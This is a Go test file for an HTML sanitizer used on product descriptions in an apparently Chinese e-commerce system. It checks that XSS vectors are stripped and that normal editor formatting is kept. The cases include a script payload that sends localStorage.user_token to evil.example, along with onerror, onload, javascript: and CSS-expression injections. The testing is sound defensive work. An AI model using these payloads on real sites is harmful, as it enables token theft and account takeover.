package richtext

import (
	"strings"
	"testing"
)

// TestSanitizeStripsScriptVectors 固化一批攻击向量，防止以后有人放开白名单。
//
// 这些载荷对应审计确认的攻击链：内容编辑者（不必是超管）往商品正文里注入脚本，
// 浏览该商品的用户或管理员执行后，同源 localStorage 里的 user_token / admin_token
// 被读走，进而账户接管。
func TestSanitizeStripsScriptVectors(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		mustNot []string
	}{
		{
			name:    "script tag",
			input:   `<p>正常正文</p><script>fetch('https://evil.example?t='+localStorage.user_token)</script>`,
			mustNot: []string{"<script", "evil.example"},
		},
		{
			name:    "img onerror",
			input:   `<img src=x onerror="alert(localStorage.admin_token)">`,
			mustNot: []string{"onerror", "alert("},
		},
		{
			name:    "svg onload",
			input:   `<svg onload="alert(1)"></svg>`,
			mustNot: []string{"<svg", "onload"},
		},
		{
			name:    "javascript protocol",
			input:   `<a href="javascript:alert(1)">点我</a>`,
			mustNot: []string{"javascript:"},
		},
		{
			name:    "iframe",
			input:   `<iframe src="https://evil.example"></iframe>`,
			mustNot: []string{"<iframe"},
		},
		{
			name:    "form and input",
			input:   `<form action="https://evil.example"><input name="x"></form>`,
			mustNot: []string{"<form", "<input"},
		},
		{
			name:    "style expression",
			input:   `<div style="width: expression(alert(1))">x</div>`,
			mustNot: []string{"expression"},
		},
		{
			name:    "style url",
			input:   `<div style="background-color: url(https://evil.example/a.png)">x</div>`,
			mustNot: []string{"url("},
		},
		{
			name:    "data uri image",
			input:   `<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
			mustNot: []string{"data:text/html"},
		},
		{
			name:    "dom clobbering via id",
			input:   `<div id="config" name="config">x</div>`,
			mustNot: []string{`id="config"`, `name="config"`},
		},
		{
			name:    "event handler attribute",
			input:   `<p onclick="alert(1)">x</p>`,
			mustNot: []string{"onclick"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Sanitize(tc.input)
			for _, bad := range tc.mustNot {
				if strings.Contains(strings.ToLower(got), strings.ToLower(bad)) {
					t.Fatalf("sanitized output still contains %q\ninput:  %s\noutput: %s", bad, tc.input, got)
				}
			}
		})
	}
}

// TestSanitizePreservesEditorOutput 确认净化没有误伤编辑器产出的正常排版。
// 白名单写得太紧会让商品详情丢失表格、颜色或对齐，这是比漏放更常见的回归。
func TestSanitizePreservesEditorOutput(t *testing.T) {
	input := `<h2>规格</h2>` +
		`<p style="text-align: center">居中说明</p>` +
		`<p><strong>加粗</strong><em>斜体</em><u>下划线</u></p>` +
		`<ul><li>项目一</li><li>项目二</li></ul>` +
		`<blockquote>引用</blockquote>` +
		`<pre><code>code()</code></pre>` +
		`<table><thead><tr><th colspan="2">表头</th></tr></thead>` +
		`<tbody><tr><td rowspan="1">单元格</td><td>另一个</td></tr></tbody></table>` +
		`<p><a href="https://example.com/doc">外链</a></p>` +
		`<p><img src="/uploads/2026/09/a.png" alt="图" title="标题"></p>`

	got := Sanitize(input)

	mustContain := []string{
		"<h2>", "<strong>", "<em>", "<u>", "<ul>", "<li>", "<blockquote>",
		"<pre>", "<code>", "<table>", "<thead>", "<th", "<td", "colspan", "rowspan",
		`href="https://example.com/doc"`, `src="/uploads/2026/09/a.png"`, `alt="图"`,
	}
	for _, want := range mustContain {
		if !strings.Contains(got, want) {
			t.Errorf("sanitized output dropped %q\noutput: %s", want, got)
		}
	}
}

// TestSanitizeAllowsEditorStyles 排版样式必须保留，否则商品的居中和配色会丢失。
func TestSanitizeAllowsEditorStyles(t *testing.T) {
	got := Sanitize(`<p style="text-align: center; color: #0f766e">彩色居中</p>`)

	if !strings.Contains(got, "text-align") {
		t.Errorf("text-align should survive sanitization, got %s", got)
	}
	if !strings.Contains(got, "color") {
		t.Errorf("color should survive sanitization, got %s", got)
	}
}

// TestSanitizeStripsUnknownStyleProperties 白名单之外的样式声明应当被丢弃，
// 而不是让整个 style 属性原样通过。
func TestSanitizeStripsUnknownStyleProperties(t *testing.T) {
	got := Sanitize(`<p style="position: fixed; top: 0; z-index: 9999; text-align: right">x</p>`)

	for _, bad := range []string{"position", "z-index", "top:"} {
		if strings.Contains(got, bad) {
			t.Errorf("style declaration %q should have been dropped, got %s", bad, got)
		}
	}
	if !strings.Contains(got, "text-align") {
		t.Errorf("allowed declaration should remain, got %s", got)
	}
}

// TestSanitizeExternalLinksGetRel 外链应自动补 rel，避免 tabnabbing。
func TestSanitizeExternalLinksGetRel(t *testing.T) {
	got := Sanitize(`<a href="https://example.com">外链</a>`)

	if !strings.Contains(got, `target="_blank"`) {
		t.Errorf("fully qualified links should open in a new tab, got %s", got)
	}
	if !strings.Contains(got, "noopener") && !strings.Contains(got, "noreferrer") {
		t.Errorf("fully qualified links should carry a rel attribute, got %s", got)
	}
}

// TestSanitizeEmpty 空输入返回空串，调用方无需自行判空。
func TestSanitizeEmpty(t *testing.T) {
	for _, input := range []string{"", "   ", "\n\t"} {
		if got := Sanitize(input); got != "" {
			t.Errorf("Sanitize(%q) = %q, want empty", input, got)
		}
	}
}

// TestSanitizeLocalized 多语言字段逐个净化，非字符串取值原样保留。
func TestSanitizeLocalized(t *testing.T) {
	got := SanitizeLocalized(map[string]interface{}{
		"zh-CN": `<p>正常</p><script>alert(1)</script>`,
		"en-US": `<p>ok</p>`,
		"bad":   nil,
	})

	if strings.Contains(got["zh-CN"].(string), "<script") {
		t.Errorf("zh-CN should be sanitized, got %v", got["zh-CN"])
	}
	if got["en-US"].(string) != "<p>ok</p>" {
		t.Errorf("en-US should be preserved, got %v", got["en-US"])
	}
	if got["bad"] != nil {
		t.Errorf("non-string values should pass through unchanged, got %v", got["bad"])
	}
}

// TestSanitizeLocalizedEmpty 空 map 原样返回，避免调用方拿到 nil 后需要额外判空。
func TestSanitizeLocalizedEmpty(t *testing.T) {
	if got := SanitizeLocalized(nil); got != nil {
		t.Errorf("nil input should return nil, got %v", got)
	}
}
